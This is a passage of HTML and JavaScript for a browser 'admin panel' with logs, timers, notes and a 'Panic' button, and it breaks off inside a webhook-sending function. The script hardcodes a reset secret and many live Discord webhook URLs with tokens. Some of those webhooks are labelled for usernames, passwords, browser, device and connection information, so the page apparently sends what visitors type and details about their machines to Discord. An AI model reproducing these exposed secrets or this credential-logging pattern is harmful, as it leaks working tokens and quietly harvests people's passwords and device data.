<div class="cube-face front"></div>
<div class="cube-face back"></div>
<div class="cube-face right"></div>
<div class="cube-face left"></div>
<div class="cube-face top"></div>
<div class="cube-face bottom"></div>
</div>
<div class="init-text">Loading Admin Panel...</div>
<div class="code-rain" id="loadingCodeRain"></div>
</div>

<!-- Dashboard (now Admin Panel) -->
<div id="dashboard" class="dashboard">
<!-- Welcome Notification -->
<div id="welcomeNotification" class="notification">
<i class="fas fa-user-check"></i> Welcome <span id="loggedUser">User</span> to the Admin Panel!
</div>

<!-- Admin Panel Header -->
<div class="dashboard-header">
<div>
<h1 class="text-2xl font-bold"><i class="fas fa-user-shield"></i> Enhanced Admin Panel</h1>
<p class="text-sm opacity-80">Admin: <span id="currentUser">Beta.user</span> | ID: <span id="currentUserID">281573</span></p>
</div>
<div class="bg-white text-black px-4 py-2 rounded-lg font-bold">
Version 2.0.1 (Admin)
</div>
</div>

<!-- Quick Bar with Search, Session Time, Real Time, and Buttons -->
<div class="dashboard-quickbar">
<!-- Left Section: Search and Time Displays -->
<div class="search-group">
<div class="search-container">
<input type="text" class="search-bar" id="searchBar" placeholder="Search panels, features...">
<button class="search-btn" onclick="performSearch()"><i class="fas fa-search"></i></button>
</div>
<div class="quickbar-time-info">Session Time: <span id="quickbarSessionTime" class="quickbar-time-value">00:00:00</span></div>
<div class="quickbar-time-info">Real Time: <span id="quickbarCurrentTime" class="quickbar-time-value">00:00:00</span></div>
</div>

<!-- Right Section: All other buttons -->
<div class="quick-btn-group">
<button class="quick-btn" onclick="togglePanel('userLogsPanel')">
<i class="fas fa-users"></i> User Logs
</button>
<button class="quick-btn" onclick="togglePanel('changeLogsPanel')">
<i class="fas fa-history"></i> Change Logs
</button>
<button class="quick-btn" onclick="togglePanel('downloadLogsPanel')">
<i class="fas fa-download"></i> Download Logs
</button>
<button class="quick-btn" onclick="togglePanel('discordWebhooksPanel')">
<i class="fab fa-discord"></i> Webhooks
</button>
<button class="quick-btn" onclick="togglePanel('adminCommandsPanel')">
<i class="fas fa-terminal"></i> Commands
</button>
<button class="quick-btn" onclick="togglePanel('settingsModal')">
<i class="fas fa-cog"></i> Settings
</button>
<button class="quick-btn" onclick="togglePanel('timerPanel')">
<i class="fas fa-stopwatch"></i> Timer
</button>
<button class="quick-btn" onclick="togglePanel('notesPanel')">
<i class="fas fa-pen"></i> Notes
</button>
<button class="quick-btn" onclick="showStats()">
<i class="fas fa-chart-bar"></i> Stats
</button>
<button class="quick-btn" onclick="takeScreenshot()">
<i class="fas fa-camera"></i> Screenshot
</button>
<button class="quick-btn" onclick="togglePanelsGridVisibility()">
<i class="fas fa-toggle-on"></i> Toggle Sections
</button>
<button class="quick-btn" onclick="adjustZoom(0.1)">
<i class="fas fa-search-plus"></i> Zoom In
</button>
<button class="quick-btn" onclick="adjustZoom(-0.1)">
<i class="fas fa-search-minus"></i> Zoom Out
</button>
<button class="quick-btn" onclick="restartSystem()">
<i class="fas fa-redo-alt"></i> Restart
</button>
<button class="quick-btn panic-btn" onclick="window.open('https://clever.com', '_blank')">
<i class="fas fa-exclamation-triangle"></i> Panic
</button>
<button class="quick-btn" onclick="toggleTheme()">
<i class="fas fa-palette"></i> Theme
</button>
<button class="quick-btn" onclick="logout()">
<i class="fas fa-sign-out-alt"></i> Logout
</button>
</div>
</div>

<!-- Announcement Bar -->
<div class="announcement-bar mt-4">
<div class="announcement-content">
<p id="announcementText">Important System Announcement: Scheduled maintenance this weekend. System may experience brief interruptions. Please save your work regularly!</p>
</div>
</div>

<!-- Main Panels Grid -->
<div class="panels-grid" id="panelsGrid">

<!-- User Logs Panel (Rectangular) -->
<div class="panel col-span-2" data-panel="userLogs">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-users"></i> User Logs (All Activity)</div>
<div class="panel-controls">
<button class="panel-btn" onclick="downloadAllLogs()"><i class="fas fa-download"></i></button>
<button class="panel-btn" onclick="clearAdminLogs()"><i class="fas fa-trash"></i></button>
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div id="userLogsList" class="max-h-80 overflow-y-auto space-y-2">
<!-- All user activity logs will be populated here -->
</div>
</div>

<!-- Change Logs Panel -->
<div class="panel" data-panel="changeLogs">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-clipboard-list"></i> Change Logs</div>
<div class="panel-controls">
<button class="panel-btn" onclick="downloadChangeLogs()"><i class="fas fa-download"></i></button>
<button class="panel-btn" onclick="clearChangeLogs()"><i class="fas fa-trash"></i></button>
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div id="changeLogsList" class="max-h-40 overflow-y-auto space-y-2">
<!-- Change logs (theme, settings etc.) will be populated here -->
</div>
</div>

<!-- Download Logs Panel -->
<div class="panel" data-panel="downloadLogs">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-download"></i> Download Logs</div>
<div class="panel-controls">
<button class="panel-btn" onclick="downloadDownloadLogs()"><i class="fas fa-download"></i></button>
<button class="panel-btn" onclick="clearDownloadLogs()"><i class="fas fa-trash"></i></button>
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div id="downloadLogsList" class="max-h-40 overflow-y-auto space-y-2">
<!-- Download activity with screenshot info will be populated here -->
</div>
</div>

<!-- Discord Webhooks Panel -->
<div class="panel" data-panel="discordWebhooks">
<div class="panel-header">
<div class="panel-title"><i class="fab fa-discord"></i> Discord Webhooks</div>
<div class="panel-controls">
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div id="webhooksList" class="max-h-40 overflow-y-auto space-y-2 text-sm break-all">
<!-- Webhook URLs will be displayed here -->
</div>
</div>

<!-- Admin Commands Panel -->
<div class="panel col-span-2" data-panel="adminCommands">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-terminal"></i> Admin Commands</div>
<div class="panel-controls">
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div class="max-h-80 overflow-y-auto">
<div class="admin-command-group">
<h4 class="w-full text-md font-semibold text-accent-color mb-2">Logging & Data</h4>
<button class="admin-command-btn" onclick="simulateUserLogin()"><i class="fas fa-sign-in-alt"></i> Simulate Login</button>
<button class="admin-command-btn" onclick="simulateUserAction()"><i class="fas fa-user-ninja"></i> Simulate User Action</button>
<button class="admin-command-btn" onclick="simulateSettingsChange()"><i class="fas fa-sliders-h"></i> Simulate Settings Change</button>
<button class="admin-command-btn" onclick="simulateFileDownload()"><i class="fas fa-file-download"></i> Simulate File Download</button>
<button class="admin-command-btn" onclick="simulateErrorEvent()"><i class="fas fa-bug"></i> Simulate Error Event</button>
<button class="admin-command-btn dangerous" onclick="confirmAndRunCommand('clearAllLogs')"><i class="fas fa-eraser"></i> Clear All Local Logs</button>
<button class="admin-command-btn dangerous" onclick="confirmAndRunCommand('wipeLocalStorage')"><i class="fas fa-skull-crossbones"></i> Wipe All Local Data</button>
<button class="admin-command-btn" onclick="confirmAndRunCommand('downloadCurrentState')"><i class="fas fa-save"></i> Download Current State</button>
</div>

<div class="admin-command-group">
<h4 class="w-full text-md font-semibold text-accent-color mb-2">System & UI</h4>
<button class="admin-command-btn" onclick="forceTheme('dark')"><i class="fas fa-moon"></i> Force Dark Theme</button>
<button class="admin-command-btn" onclick="forceTheme('light')"><i class="fas fa-sun"></i> Force Light Theme</button>
<button class="admin-command-btn" onclick="updateAnnouncement()"><i class="fas fa-bullhorn"></i> Update Announcement</button>
<button class="admin-command-btn" onclick="toggleFeature('developerMode')"><i class="fas fa-code"></i> Toggle Developer Mode</button>
<button class="admin-command-btn" onclick="toggleFeature('compactView')"><i class="fas fa-compress-alt"></i> Toggle Compact View</button>
<button class="admin-command-btn" onclick="reloadPanels()"><i class="fas fa-sync-alt"></i> Reload Panels</button>
<button class="admin-command-btn" onclick="setSessionTimeout()"><i class="fas fa-hourglass-end"></i> Set Session Timeout</button>
<button class="admin-command-btn" onclick="forceLogout()"><i class="fas fa-sign-out-alt"></i> Force Logout</button>
</div>

<div class="admin-command-group">
<h4 class="w-full text-md font-semibold text-accent-color mb-2">Remote (Simulated)</h4>
<button class="admin-command-btn" onclick="sendMessageToDiscord('general_notification', 'Admin triggered a general notification.')"><i class="fab fa-discord"></i> Send Discord Notif</button>
<button class="admin-command-btn" onclick="sendMessageToDiscord('urgent_alert', 'Admin triggered an urgent alert!')" style="background-color: var(--error-color);"><i class="fas fa-exclamation-triangle"></i> Send Discord Alert</button>
<button class="admin-command-btn" onclick="updateWebsiteContent('new_blog_post')"><i class="fas fa-globe"></i> Update Website Content (Simulated)</button>
<button class="admin-command-btn" onclick="performSecurityScan()"><i class="fas fa-shield-alt"></i> Perform Security Scan (Simulated)</button>
</div>
</div>
</div>

<!-- Calendar Panel -->
<div class="panel" data-panel="calendar">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-calendar"></i> Calendar</div>
<div class="panel-controls">
<button class="panel-btn" onclick="minimizePanel(this)"><i class="fas fa-minus"></i></button>
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div class="calendar-grid" id="calendarGrid">
<!-- Calendar will be generated here -->
</div>
</div>

<!-- Important Dates Panel -->
<div class="panel" data-panel="importantDates">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-star"></i> Important Dates</div>
<div class="panel-controls">
<button class="panel-btn" onclick="clearImportantDates()"><i class="fas fa-trash"></i></button>
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div class="content">
<input type="date" id="importantDateDay" class="important-date-input" value="2025-08-24">
<input type="time" id="importantDateTime" class="important-date-input" value="09:00">
<input type="text" id="importantDateEvent" class="important-date-event-input" placeholder="Event Description...">
<button class="quick-btn w-full mt-2" onclick="addImportantDate()">Add Event</button>
<div id="importantDatesList" class="mt-4 max-h-40 overflow-y-auto space-y-2">
<!-- Important dates will be populated here -->
</div>
</div>
</div>

<!-- Random Facts Panel -->
<div class="panel" data-panel="facts">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-lightbulb"></i> Random Facts</div>
<div class="panel-controls">
<button class="panel-btn" onclick="refreshFact()"><i class="fas fa-sync"></i></button>
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div id="randomFact" class="text-sm">
Did you know? The human brain contains approximately 86 billion neurons!
</div>
</div>

<!-- Daily Quotes Panel -->
<div class="panel" data-panel="quotes">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-quote-left"></i> Daily Quote</div>
<div class="panel-controls">
<button class="panel-btn" onclick="refreshQuote()"><i class="fas fa-sync"></i></button>
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div id="dailyQuote" class="text-sm italic">
"The only way to do great work is to love what you do." - Steve Jobs
</div>
</div>

<!-- System Updates Panel -->
<div class="panel" data-panel="updates">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-sync-alt"></i> System Updates & Status</div>
<div class="panel-controls">
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div class="space-y-2">
<div class="system-update-item">Admin UI v2.0.1 Deployed</div>
<div class="system-update-item">Enhanced Logging Activated</div>
<div class="system-update-item">New Command Set Available</div>
</div>
</div>

<!-- Notifications Panel -->
<div class="panel" data-panel="notifications">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-bell"></i> Notifications</div>
<div class="panel-controls">
<button class="panel-btn" onclick="clearNotifications()"><i class="fas fa-trash"></i></button>
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div id="notificationsList" class="space-y-2">
<div class="p-2 bg-blue-900 rounded text-xs">System initialized successfully</div>
<div class="p-2 bg-green-900 rounded text-xs">All security checks passed</div>
</div>
</div>

<!-- Error Log Panel -->
<div class="panel" data-panel="errorLog">
<div class="panel-header">
<div class="panel-title"><i class="fas fa-bug"></i> System Error Log</div>
<div class="panel-controls">
<button class="panel-btn" onclick="downloadErrorLogs()"><i class="fas fa-download"></i></button>
<button class="panel-btn" onclick="clearErrorLogs()"><i class="fas fa-trash"></i></button>
<button class="panel-btn" onclick="closePanel(this)"><i class="fas fa-times"></i></button>
</div>
</div>
<div id="errorLogsList" class="max-h-40 overflow-y-auto space-y-2">
<!-- Error logs will be populated here -->
</div>
</div>

</div>

<!-- Settings Modal -->
<div id="settingsModal" class="settings-modal">
<div class="settings-content">
<div class="flex justify-between items-center mb-6">
<h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-cog"></i> System Settings</h2>
<button onclick="togglePanel('settingsModal')" class="text-2xl text-gray-400 hover:text-white">
<i class="fas fa-times"></i>
</button>
</div>

<div class="settings-grid">
<div class="setting-item">
<span>Dark Mode</span>
<div class="toggle-switch" onclick="toggleSetting(this, 'darkMode')">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Auto-save Notes</span>
<div class="toggle-switch active" onclick="toggleSetting(this, 'autoSaveNotes')">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Sound Notifications</span>
<div class="toggle-switch" onclick="toggleSetting(this, 'soundNotifications')">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Auto-refresh Data</span>
<div class="toggle-switch active" onclick="toggleSetting(this, 'autoRefreshData')">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Compact View</span>
<div class="toggle-switch" onclick="toggleSetting(this, 'compactView')">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Show Animations</span>
<div class="toggle-switch active" onclick="toggleSetting(this, 'showAnimations')">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>High Contrast</span>
<div class="toggle-switch" onclick="toggleSetting(this, 'highContrast')">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Auto-backup</span>
<div class="toggle-switch active" onclick="toggleSetting(this, 'autoBackup')">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Security Mode</span>
<div class="toggle-switch active" onclick="toggleSetting(this, 'securityMode')">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Advanced Logging</span>
<div class="toggle-switch" onclick="toggleSetting(this, 'advancedLogging')">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Performance Mode</span>
<div class="toggle-switch" onclick="toggleSetting(this, 'performanceMode')">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Developer Mode</span>
<div class="toggle-switch" onclick="toggleSetting(this, 'developerMode')">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Experimental Features</span>
<div class="toggle-switch" onclick="toggleSetting(this, 'experimentalFeatures')">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Data Compression</span>
<div class="toggle-switch active" onclick="toggleSetting(this, 'dataCompression')">
<div class="toggle-slider"></div>
</div>
</div>
<div class="setting-item">
<span>Real-time Sync</span>
<div class="toggle-switch" onclick="toggleSetting(this, 'realtimeSync')">
<div class="toggle-slider"></div>
</div>
</div>
</div>

<!-- Keybinds Section -->
<div class="mt-8">
<h3 class="text-xl font-bold text-orange-500 mb-4"><i class="fas fa-keyboard"></i> Keybinds Configuration</h3>
<div class="space-y-3" id="keybindsList">
<div class="keybind-item">
<span>Open Settings</span>
<input type="text" class="keybind-input" value="Ctrl+," placeholder="Press keys...">
</div>
<div class="keybind-item">
<span>Quick Search</span>
<input type="text" class="keybind-input" value="Ctrl+K" placeholder="Press keys...">
</div>
<div class="keybind-item">
<span>New Note</span>
<input type="text" class="keybind-input" value="Ctrl+N" placeholder="Press keys...">
</div>
<div class="keybind-item">
<span>Save All</span>
<input type="text" class="keybind-input" value="Ctrl+S" placeholder="Press keys...">
</div>
<div class="keybind-item">
<span>Toggle Theme</span>
<input type="text" class="keybind-input" value="Ctrl+T" placeholder="Press keys...">
</div>
</div>
</div>

<!-- Theme Selector -->
<div class="mt-8">
<h3 class="text-xl font-bold text-orange-500 mb-4"><i class="fas fa-palette"></i> Accent Theme Selection</h3>
<div class="theme-selector">
<div class="theme-option active" style="background: linear-gradient(135deg, #ff4500, #ff6b35);" onclick="applyAccentTheme('orange', event)">Orange</div>
<div class="theme-option" style="background: linear-gradient(135deg, #0066cc, #004499);" onclick="applyAccentTheme('blue', event)">Blue</div>
<div class="theme-option" style="background: linear-gradient(135deg, #00cc44, #009933);" onclick="applyAccentTheme('green', event)">Green</div>
<div class="theme-option" style="background: linear-gradient(135deg, #cc0044, #990033);" onclick="applyAccentTheme('red', event)">Red</div>
<div class="theme-option" style="background: linear-gradient(135deg, #8800cc, #6600aa);" onclick="applyAccentTheme('purple', event)">Purple</div>
<div class="theme-option" style="background: linear-gradient(135deg, #ffaa00, #ff8800);" onclick="applyAccentTheme('amber', event)">Amber</div>
<div class="theme-option" style="background: linear-gradient(135deg, #00aaaa, #008888);" onclick="applyAccentTheme('teal', event)">Teal</div>
<div class="theme-option" style="background: linear-gradient(135deg, #ff0088, #cc0066);" onclick="applyAccentTheme('pink', event)">Pink</div>
</div>
</div>
</div>
</div>

<!-- Timer Panel -->
<div id="timerPanel" class="settings-modal">
<div class="settings-content">
<div class="flex justify-between items-center mb-6">
<h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-stopwatch"></i> Timer & Stopwatch</h2>
<button onclick="togglePanel('timerPanel')" class="text-2xl text-gray-400 hover:text-white">
<i class="fas fa-times"></i>
</button>
</div>

<div class="grid grid-cols-1 md:grid-cols-2 gap-8">
<!-- Stopwatch -->
<div class="bg-gray-800 p-6 rounded-lg">
<h3 class="text-lg font-bold mb-4 text-center">Stopwatch</h3>
<div class="timer-display" id="stopwatchDisplay">00:00:00</div>
<div class="timer-controls">
<button class="tool-btn" onclick="startStopwatch()"><i class="fas fa-play"></i> Start</button>
<button class="tool-btn" onclick="pauseStopwatch()"><i class="fas fa-pause"></i> Pause</button>
<button class="tool-btn" onclick="resetStopwatch()"><i class="fas fa-stop"></i> Reset</button>
</div>
</div>

<!-- Timer -->
<div class="bg-gray-800 p-6 rounded-lg">
<h3 class="text-lg font-bold mb-4 text-center">Countdown Timer</h3>
<div class="timer-display" id="timerDisplay">00:00:00</div>
<div class="flex justify-center gap-2 mb-4">
<input type="number" id="timerHours" class="w-16 p-2 bg-gray-700 rounded text-center" placeholder="HH" min="0" max="23">
<input type="number" id="timerMinutes" class="w-16 p-2 bg-gray-700 rounded text-center" placeholder="MM" min="0" max="59">
<input type="number" id="timerSeconds" class="w-16 p-2 bg-gray-700 rounded text-center" placeholder="SS" min="0" max="59">
</div>
<div class="timer-controls">
<button class="tool-btn" onclick="startTimer()"><i class="fas fa-play"></i> Start</button>
<button class="tool-btn" onclick="pauseTimer()"><i class="fas fa-pause"></i> Pause</button>
<button class="tool-btn" onclick="resetTimer()"><i class="fas fa-stop"></i> Reset</button>
</div>
</div>
</div>

<!-- Reminders -->
<div class="mt-8">
<h3 class="text-lg font-bold mb-4"><i class="fas fa-bell"></i> Reminders</h3>
<div class="flex gap-2 mb-4">
<input type="text" id="reminderText" class="flex-1 p-2 bg-gray-700 rounded" placeholder="Reminder text...">
<input type="datetime-local" id="reminderTime" class="p-2 bg-gray-700 rounded">
<button class="tool-btn" onclick="addReminder()"><i class="fas fa-plus"></i> Add</button>
</div>
<div id="remindersList" class="space-y-2">
<!-- Reminders will be populated here -->
</div>
</div>
</div>
</div>

<!-- Notes Panel -->
<div id="notesPanel" class="settings-modal">
<div class="settings-content">
<div class="flex justify-between items-center mb-6">
<h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-pen"></i> Enhanced Notes</h2>
<button onclick="togglePanel('notesPanel')" class="text-2xl text-gray-400 hover:text-white">
<i class="fas fa-times"></i>
</button>
</div>

<div class="drawing-tools">
<button class="tool-btn active" data-tool="pen" onclick="selectTool(this, 'pen')">
<i class="fas fa-pen"></i> Pen
</button>
<button class="tool-btn" data-tool="brush" onclick="selectTool(this, 'brush')">
<i class="fas fa-paint-brush"></i> Brush
</button>
<button class="tool-btn" data-tool="eraser" onclick="selectTool(this, 'eraser')">
<i class="fas fa-eraser"></i> Eraser
</button>
<button class="tool-btn" data-tool="text" onclick="selectTool(this, 'text')">
<i class="fas fa-text-height"></i> Text
</button>
<button class="tool-btn" data-tool="line" onclick="selectTool(this, 'line')">
<i class="fas fa-minus"></i> Line
</button>
<button class="tool-btn" data-tool="rectangle" onclick="selectTool(this, 'rectangle')">
<i class="fas fa-square"></i> Rectangle
</button>
<button class="tool-btn" data-tool="circle" onclick="selectTool(this, 'circle')">
<i class="fas fa-circle"></i> Circle
</button>

<div class="flex items-center gap-2">
<label class="text-sm">Color:</label>
<input type="color" id="penColor" class="color-picker" value="#ff4500">
</div>

<div class="flex items-center gap-2">
<label class="text-sm">Thickness:</label>
<input type="range" id="penThickness" class="thickness-slider" min="1" max="20" value="2">
</div>

<div class="flex items-center gap-2">
<label class="text-sm">Material:</label>
<select id="penMaterial" class="bg-gray-700 text-white p-1 rounded">
<option value="solid">Solid</option>
<option value="dashed">Dashed</option>
<option value="dotted">D-otted</option>
</select>
</div>

<button class="tool-btn" onclick="clearCanvas()">
<i class="fas fa-trash"></i> Clear
</button>
<button class="tool-btn" onclick="saveCanvas()">
<i class="fas fa-save"></i> Save
</button>
</div>

<canvas id="drawingCanvas" width="760" height="400" class="w-full border border-gray-600 rounded mt-4 bg-white cursor-crosshair"></canvas>

<!-- Text Notes Section -->
<div class="mt-6">
<h3 class="text-lg font-bold mb-2"><i class="fas fa-sticky-note"></i> Text Notes</h3>
<textarea id="textNotes" class="w-full h-32 p-3 bg-gray-700 rounded resize-none" placeholder="Type your notes here..."></textarea>
<div class="flex gap-2 mt-2">
<button class="tool-btn" onclick="saveTextNotes()"><i class="fas fa-save"></i> Save Notes</button>
<button class="tool-btn" onclick="clearTextNotes()"><i class="fas fa-trash"></i> Clear Notes</button>
</div>
</div>
</div>
</div>


<!-- Stats Panel -->
<div id="statsPanel" class="settings-modal">
<div class="settings-content">
<div class="flex justify-between items-center mb-6">
<h2 class="text-2xl font-bold text-orange-500"><i class="fas fa-chart-bar"></i> Usage Statistics</h2>
<button onclick="togglePanel('statsPanel')" class="text-2xl text-gray-400 hover:text-white">
<i class="fas fa-times"></i>
</button>
</div>

<div class="stats-grid">
<div class="stat-item">
<div class="stat-number" id="buttonPresses">0</div>
<div class="stat-label">Button Presses</div>
</div>
<div class="stat-item">
<div class="stat-number" id="toggleSwitches">0</div>
<div class="stat-label">Toggle Switches</div>
</div>
<div class="stat-item">
<div class="stat-number" id="panelsOpened">0</div>
<div class="stat-label">Panels Opened</div>
</div>
<div class="stat-item">
<div class="stat-number" id="panelsClosed">0</div>
<div class="stat-label">Panels Closed</div>
</div>
<div class="stat-item">
<div class="stat-number" id="searchQueries">0</div>
<div class="stat-label">Search Queries</div>
</div>
<div class="stat-item">
<div class="stat-number" id="sessionTime">00:00:00</div>
<div class="stat-label">Session Time</div>
</div>
</div>

<!-- Chart -->
<div class="mt-8">
<canvas id="statsChart" style="height: 400px;"></canvas>
</div>
</div>
</div>
</div>

<script>
// Global variables
let currentUser = '';
let currentUserID = '';
let attempts = 3; 
let is24HourFormat = false;
let currentZoom = 1;

// Consolidated logging for admin panel
let adminLogs = []; // Stores all types of logs (user actions, changes, downloads, errors, logins)
let errorLogs = []; // Specific for critical system errors (still kept separate for clarity)

let importantDates = [];
let clickCount = 0; // Keeping this for the Stats panel, but its dedicated panel is removed.

let whitelist = []; // To store data from Whitelist.json
const WHITELIST_URL = "https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json";
const RESET_CODE_SECRET = 'Reset.2579'; // The secret code for resetting attempts

// All Discord Webhook URLs, mapped to the channel names from the screenshot
const webhooks = {
    usernameInformation: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
    passwordInformation: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
    identifierInformation: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
    invaildUsernameInformation: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
    invaildPasswordInformation: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
    invaildIdentifierInformation: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
    attemptCounterInformation: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
    attemptExceededInformation: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ',
    resetInformation: 'https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq', // This seems to be the "RESET_INFORMATION" channel
    correctInformation: 'https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB',
    incorrectInformation: 'https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip',
    userInformation: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
    browserInformation: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
    deviceInformation: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLWPCbTltBfch-i970d1F',
    connectionInformation: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
    sessionInformation: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk',
    adminAction: 'https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq', // Using existing resetInformation for general admin actions
    downloadLog: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk' // Using existing sessionInformation for downloads for now, you can create a new one.
};

let stats = {
    buttonPresses: 0,
    toggleSwitches: 0,
    panelsOpened: 0,
    panelsClosed: 0,
    searchQueries: 0,
    sessionStartTime: null
};
let isLightMode = false; // Added to track current theme

// Timer variables
let stopwatchInterval = null;
let stopwatchTime = 0;
let timerInterval = null;
let timerTime = 0;
let isStopwatchRunning = false;
let isTimerRunning = false;

// Drawing variables
let isDrawing = false;
let currentTool = 'pen';
let currentColor = '#ff4500';
let currentThickness = 2;
let canvas, ctx;


// DOM elements for login and reset
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const userIDInput = document.getElementById('userID');
const submitBtn = document.getElementById('submitBtn');
const errorMsg = document.getElementById('errorMsg');
const attemptsText = document.getElementById('attemptsText');
const resetPopup = document.getElementById('resetPopup');
const resetField = document.getElementById('resetField');
const resetBtn = document.getElementById('resetBtn');

const EMBED_FIELD_LIMIT = 25; // Discord API limit for fields per embed


// Helper function to chunk fields into multiple embeds
function createEmbedsFromFields(title, color, fields, description = null) {
    const embeds = [];
    for (let i = 0; i < fields.length; i += EMBED_FIELD_LIMIT) {
        const chunk = fields.slice(i, i + EMBED_FIELD_LIMIT);
        embeds.push({
            title: i === 0 ? title : `${title} (Part ${Math.floor(i / EMBED_FIELD_LIMIT) + 1})`,
            description: i === 0 ? description : null,
            color: color,
            fields: chunk
        });
    }
    if (embeds.length === 0) { // Ensure at least one empty embed if no fields
        embeds.push({
            title: title,
            description: description || "No specific details available.",
            color: color
        });
    }
    return embeds;
}


// Function to send data to Discord webhook
// This function now expects an array of embed objects
async function sendWebhook(url, embeds, username = "System Logger") {
    if (!url) {
        console.error("Webhook URL is undefined for sending embeds:", embeds);
        logError(`Attempted to send webhook with undefined URL for embed.`);
        return;
    }

    const finalEmbeds = embeds.map(embed => ({
        ...embed,
        timestamp: embed.timestamp || new Date().toISOString(),
        footer: {
            text: `${username} | ${navigator.userAgent.substring(0, Math.min(250, navigator.userAgent.length))}...` // Truncate UA for footer
        }
    }));

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ embeds: finalEmbeds }),
        });

